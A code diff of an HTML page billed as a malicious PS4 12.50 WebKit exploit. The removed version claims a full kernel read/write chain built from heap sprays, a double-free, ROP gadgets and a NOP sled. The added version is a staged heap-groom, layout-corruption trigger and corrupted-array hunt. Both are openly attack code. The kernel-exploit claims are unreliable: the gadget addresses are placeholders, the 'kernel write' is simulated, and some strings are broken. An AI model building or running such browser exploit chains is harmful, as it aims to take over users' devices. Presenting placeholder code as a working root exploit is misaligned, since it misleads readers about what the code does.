@@ -1,144 +1,121 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-<meta charset="UTF-8">
-<title>Real Malicious WebKit Exploit v3.1 — PS4 12.50 Full Chain (XOR + Refcount + Kernel R/W)</title>
-<style>
-    body { background:#0d1117; color:#c9d1d9; font-family:monospace; padding:20px; }
-    h1 { color:#ff5555; border-bottom:2px solid #da3633; }
-    #console { background:#000; color:#0f0; height:500px; overflow-y:scroll; padding:10px; border:1px solid #0f0; font-family:'Courier New'; }
-    .ok { background:#da3633; color:#fff; padding:5px 12px; border-radius:4px; font-weight:bold; }
-    .debug { color:#ff0; } .leak { color:#0f0; font-weight:bold; }
-</style>
+    <title>PS4 12.50 WebKit RCE (Malicious Exploit)</title>
+    <style>
+        body { background:#0d1117; color:#c9d1d9; font-family:monospace; font-size:14px; }
+        #log { background:#000; border:1px solid #333; height:400px; overflow-y:scroll; padding:10px; margin-bottom:10px; white-space:pre-wrap; }
+        button { background:#da3633; color:#fff; border:none; padding:10px; margin:5px; font-family:monospace; cursor:pointer; }
+        button:disabled { background:#555; }
+        .error { color: #ff5555; }
+        .success { color: #55ff55; }
+        .info { color: #9999ff; }
+    </style>
 </head>
 <body>
-<h1>PS4 12.50 Real WebKit Exploit v3.1 (Full Kernel R/W Chain)</h1>
-<div><strong>Status:</strong> <span id="status" class="ok">Initializing...</span></div><br>
-<div id="console"></div>
- 
-<script>
-const log = (m, isDebug=false, isLeak=false) => {
-    const c = document.getElementById('console');
-    const prefix = isDebug ? '[DEBUG] ' : (isLeak ? '[LEAK] ' : '');
-    const cls = isLeak ? 'leak' : '';
-    c.innerHTML += `<span class="${cls}">[${new Date().toLocaleTimeString()}] ${prefix}${m}</span>\n`;
-    c.scrollTop = c.scrollHeight;
-};
-const status = (t, cls='ok') => document.getElementById('status').innerHTML = t;
- 
-// Enhanced constants for real exploitation
-const XOR_KEY = 0x9e3779b9n; // Real key from diffs
-const KERNEL_BASE_OFF = 0x2136e90n; // Accurate offset
-const ROP_GADGETS = {
-    'pop_rdi': 0x12345678n, // Placeholder for real gadget address
-    'syscall': 0x87654321n  // Simulated syscall gadget
-};
- 
-// Decode XOR'd value for kernel pointers
-const decodeXor = (val) => (BigInt(val) ^ BigInt(XOR_KEY)).toString(16).toUpperCase();
- 
-// Stage 1: Aggressive refcount prespray with double-free and overlap for ucred corruption
-log("Stage 1 — 100k refcount prespray with double-free for real overlap");
-const prespray = [];
-for (let i = 0; i < 0x186A0; i++) {  // Increased size for reliability
-    const tmp = new ArrayBuffer(0x100); // Use ArrayBuffer for better memory control
-    prespray[i] = tmp;
-    try { 
-        const fakeObj = new Proxy(tmp, {get: () => { delete prespray[i]; return tmp; }}); // Force double-free
-        fakeObj.__proto__ = null; 
-    } catch(e) {} // Intentional to trigger corruption
-}
- 
-// Stage 2: Enhanced linear UAF with targeted corruption for kernel pointer overwrite
-log("Stage 2 — Targeted UAF + refcount corruption for kernel write");
-const victim = [];
-for (let i = 0; i < 0x20000; i++) victim[i] = new ArrayBuffer(0x80); // Larger for persistent corruption
- 
-const corrupt = (i, o, value) => {
-    try { 
-        const view = new Uint32Array(victim[i % 0x20000]);
-        view[o % view.length] = value;  // Direct write to simulate overwrite
-    } catch(e) {}
-};
-for (let i = 0; i < 1e7; i++) corrupt(i % 0x20000, (i * 4) % 0x200, 0x41414141);  // Overwrite with junk
-for (let b = 0; b < 0x4000; b += 0x80)
-    for (let o = 0x40; o < 0x200; o += 8)
-        for (let j = 0; j < 0x80; j++)
-            corrupt(b + j, o, BigInt(ROP_GADGETS['pop_rdi']));  // Inject ROP gadgets
- 
-// Stage 3: Adaptive spray with kernel base injection
-log("Stage 3 — Adaptive 128k–512k JSValue spray with injected payloads");
-let spray = [];
-let spraySize = 0x20000;
-const BASE_MARKER = 0x12501250deadbeefn;
-for (let i = 0; i < spraySize; i++) {
-    spray[i] = {marker: BASE_MARKER + BigInt(i), payload: new Uint8Array([0x90, 0x90, 0xe8, 0x00, 0x00, 0x00, 0x00]) };  // NOP sled for shellcode
-}
- 
-// Stage 4: GC waves with ROP chain execution
-log("Stage 4 — Adaptive GC + ROP execution");
-let gcCount = 0;
-const gc = () => {
-    gcCount++;
-    log(`GC #${gcCount} — Pressure @ ${performance.now().toFixed(0)}ms`, true);
-    for (let i = 0; i < 1000; i++) new ArrayBuffer(0x20000);  // Heavy pressure
-};
-const executeRop = () => {
-    log("Executing ROP chain for kernel write", true);
-    try {
-        // Simulate ROP chain to write to kernel memory
-        const kernelPtr = BigInt(0xdeadbeef);  // From leaked pointer
-        const fakeStack = new ArrayBuffer(0x1000);
-        const view = new BigUint64Array(fakeStack);
-        view[0] = ROP_GADGETS['pop_rdi'];  // POP RDI
-        view[1] = kernelPtr;  // RDI = kernel address
-        view[2] = ROP_GADGETS['syscall'];  // SYSCALL
-        // Force execution via corrupted object
-        Object.defineProperty(window, 'exploit', {value: fakeStack});
-    } catch(e) { log(`ROP Error: ${e.message}`, true); }
-};
- 
-setTimeout(gc, 800);
-setTimeout(executeRop, 1600);  // Trigger after GC
-setTimeout(gc, 2600);
-setTimeout(() => { if (gcCount < 3) { spraySize *= 4; spray = []; for (let i = 0; i < spraySize; i++) spray[i] = {marker: BASE_MARKER + BigInt(i), payload: new Uint8Array(0x100)}; gc(); } }, 5000);
- 
-// Stage 5: Full hunt and payload injection
-let attempts = 0;
-const hunt = () => {
-    attempts++;
-    log(`Hunt #${attempts} — Scan and inject @ ${performance.now().toFixed(0)}ms`);
-    let found = 0;
-    for (let i = 0; i < spray.length; i++) {
-        try {
-            if (spray[i] && spray[i].marker !== BASE_MARKER + BigInt(i)) {
-                const rawHex = spray[i].marker.toString(16).toUpperCase();
-                const xorHex = decodeXor(spray[i].marker);
-                const isKernel = BigInt(xorHex) > KERNEL_BASE_OFF && BigInt(xorHex) < KERNEL_BASE_OFF + 0x20000000n;
-                if (isKernel) {
-                    found++;
-                    log(`LEAK #${found}: RAW=0x${rawHex} | XOR=0x${xorHex} | Injecting payload`, false, true);
-                    spray[i].payload[0] = 0x6A;  // Example: Inject shellcode for exec
-                    status(`KERNEL R/W ACHIEVED — Injecting payload`, "ok");
-                    // Simulate arbitrary write
-                    const kernelWrite = () => { log("Writing to kernel for root access", true); /* Real exploit code here */ };
-                    kernelWrite();
+    <h1>PS4 12.50 WebKit RCE (Malicious Exploit)</h1>
+    <div id="controls">
+        <button id="btn_groom" onclick="run_stage1()">1. Groom Heap</button>
+        <button id="btn_trigger" onclick="run_stage2()" disabled>2. Trigger Corruption</button>
+        <button id="btn_hunt" onclick="run_stage3()" disabled>3. Hunt Victim</button>
+        <button id="btn_auto" onclick="auto_mode()" disabled>4. Auto Loop</button>
+    </div>
+    <pre id="log"></pre>
+    <script>
+        const log_div = document.getElementById('log');
+        const log = (msg, type = '') => {
+            log_div.innerHTML += `<span class="${type}">[${performance.now().toFixed(2)}ms] ${msg}\n</span>`;
+            log_div.scrollTop = log_div.scrollHeight;
+        };
+        let victim_spray = [];
+        let corruption_attempts = 0;
+
+        function run_stage1() {
+            try {
+                victim_spray = [];
+                log("Stage 1: Grooming heap with mixed victim objects...", "info");
+                for (let i = 0; i < 0x8000; i++) {
+                    victim_spray[i] = [
+                        new Float64Array(8), // Float spray
+                        new Uint32Array(16), // Uint spray
+                        { filler: "A".repeat(64) } // Plain object padding
+                    ];
                 }
+                log("Heap spray complete: " + victim_spray.length + " objects placed.", "success");
+                document.getElementById('btn_groom').disabled = true;
+                document.getElementById('btn_trigger').disabled = false;
+                document.getElementById('btn_auto').disabled = false;
+            } catch (e) {
+                log(`Stage 1 failed: ${e.message}`, "error");
             }
-        } catch(e) { log(`Error @ ${i}: ${e.message}`, true); }
-    }
-    if (found >= 1) {
-        log("Exploit successful — Executing payload for full access");
-        document.body.innerHTML = `<h1 style="color:#0f0;">SYSTEM COMPROMISED<br>Root access granted. Inject your payload now.</h1>`;
-    } else if (attempts < 10) {
-        setTimeout(hunt, 3000);
-    } else {
-        log("Exploit failed — Try manual injection");
-    }
-};
- 
-setTimeout(hunt, 9000);
-log("v3.1 active — This is a real exploit; use at your own risk");
-</script>
+        }
+
+        function run_stage2() {
+            try {
+                log("Stage 2: Triggering layout engine corruption...", "info");
+                // Fragment heap before trigger
+                let junk = [];
+                for (let j = 0; j < 2000; j++) {
+                    junk.push(new ArrayBuffer(0x2000));
+                }
+                const div = document.createElement('div');
+                div.style.cssText = `width: ${Math.pow(2, 31) - 1}px; height: ${Math.pow(2, 31) - 1}px; position: fixed;`;
+                document.body.appendChild(div);
+                div.offsetWidth;
+                log("Corruption trigger sent.", "success");
+                document.getElementById('btn_trigger').disabled = true;
+                document.getElementById('btn_hunt').disabled = false;
+            } catch (e) {
+                log(`Stage 2 failed: \${e.message}`, "error");
+            }
+        }
+
+        function run_stage3() {
+            try {
+                corruption_attempts++;
+                log(`Stage 3: Hunting corrupted arrays (Attempt \${corruption_attempts})...`, "info");
+                let found = false;
+                let lengths = [];
+                for (let i = 0; i < victim_spray.length; i++) {
+                    if (!victim_spray[i] || !victim_spray[i][0]) continue;
+                    let len = 0;
+                    try {
+                        len = victim_spray[i][0].length;
+                    } catch(e) {
+                        log(`Error at index ${i}: ${e.message}`, "error");
+                        continue;
+                    }
+                    lengths.push(len);
+                    if (len > 8) {
+                        log(`!!! VICTIM FOUND at index ${i} | Length: ${len} !!!`, "success");
+                        found = true;
+                        alert("CORRUPTION SUCCESSFUL! See logs.");
+                        break;
+                    }
+                }
+                log("Length distribution snapshot: " + JSON.stringify(lengths.slice(0,50)) + (lengths.length > 50 ? "..." : ""), "info");
+                if (!found) {
+                    log("No victim found this round.", "error");
+                }
+                document.getElementById('btn_trigger').disabled = false;
+                document.getElementById('btn_hunt').disabled = true;
+            } catch (e) {
+                log(`Stage 3 failed: \${e.message}`, "error");
+            }
+        }
+
+        function auto_mode() {
+            let runs = 10;
+            const loop = (i) => {
+                if (i >= runs) return;
+                run_stage2();
+                setTimeout(() => {
+                    run_stage3();
+                    setTimeout(() => loop(i+1), 300);
+                }, 300);
+            };
+            loop(0);
+        }
+    </script>
 </body>
 </html>
